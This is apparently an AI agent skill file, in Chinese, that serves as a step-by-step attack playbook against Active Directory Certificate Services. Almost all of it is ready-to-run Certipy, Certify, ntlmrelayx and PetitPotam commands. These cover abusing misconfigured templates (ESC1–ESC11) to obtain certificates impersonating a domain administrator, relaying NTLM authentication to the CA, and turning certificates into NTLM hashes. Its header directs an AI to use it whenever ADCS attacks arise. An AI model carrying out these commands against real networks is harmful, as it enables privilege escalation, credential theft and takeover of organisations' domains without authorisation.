---
name: adcs-attack
description: Use when encountering adcs证书服务攻击 - 涵盖active directory Certificate services的完整攻击链，包括esc1-esc15各类证书模板滥用技术
---

# AD Certificate Services (ADCS) 攻击

## Info

- **Tags**: adcs, active-directory, certificate, esc, privilege-escalation

---

## 1. 枚举证书模板

```bash
# 使用 Certify 枚举
Certify.exe find /vulnerable

# 使用 Certipy 枚举
certipy find -u user@domain.local -p password -dc-ip 10.10.10.1

# 使用 PowerShell 枚举
Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties *
```

---

## 2. ESC1 - 错误配置的证书模板（最危险）

```bash
# 利用 ESC1：模板允许任何客户端认证 + 请求者可指定 SAN
certipy req -ca 'CA-NAME' -target ca-server -template 'VulnTemplate' \
  -u user@domain -p password -upn admin@domain.local -dns dc01.domain.local

# 使用伪造票据
certipy auth -pfx admin.pfx -dc-ip 10.10.10.1
```

---

## 3. ESC2/ESC3 - 证书可用于任意目的/申请代理

```bash
# ESC2: 模板可用于任意目的
certipy req -ca 'CA-NAME' -template 'ESC2-Template' -u user@domain -p password

# ESC3: 使用 Enrollment Agent 模板申请其他证书
certipy req -ca 'CA-NAME' -template 'ESC3-Template' -u user@domain -p password
```

---

## 4. ESC4 - 模板权限滥用

```bash
# 有 GenericWrite 权限时，修改模板配置
certipy template -u user@domain -p password \
  -template 'TargetTemplate' -save-old -dc-ip 10.10.10.1

# 修改后按 ESC1 利用
certipy req -ca 'CA-NAME' -template 'TargetTemplate' \
  -u user@domain -p password -upn admin@domain.local
```

---

## 5. ESC6 - CA 允许 SAN 指定

```bash
# 检查 CA 配置
certipy find -u user@domain -p password

# 利用：直接请求带有管理员 SAN 的证书
certipy req -ca 'CA-NAME' -template 'User' -upn admin@domain.local \
  -u user@domain -p password
```

---

## 6. ESC8 - NTLM Relay 到 ADCS HTTP 端点

```bash
# 启动 ntlmrelayx 监听
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support \
  --adcs --template 'Machine'

# 强制认证 (PetitPotam)
PetitPotam.py domain/user:pass@dc01 ntlm-relay-server
# 或使用 DFSCoerce
dfsc.exe ntlm-relay-server \\dc01\share

# 获取证书后认证
certipy auth -pfx relayed.pfx
```

---

## 7. ESC11 - 无中继的 NTLM 到 RPC

```bash
# 利用 RPC 端点，需要 MIC 未强制
ntlmrelayx.py -t rpc://ca-server -smb2support --adcs
```

---

## 8. 证书转哈希

```bash
# 将证书转换为 NTLM 哈希
certipy auth -pfx cert.pfx -dc-ip 10.10.10.1

# 输出示例:
# [*] Got certificate with UPN: admin@domain.local
# [*] Using hash: aad3b435b51404eeaad3b435b51404ee:xxx
```

---

## 关键检查点

- 查找 `Client Authentication` EKU 的模板
- 查找允许 `Any Purpose` EKU 的模板
- 检查 `Enrollment Agent` 权限
- 检查 CA HTTP 端点是否启用
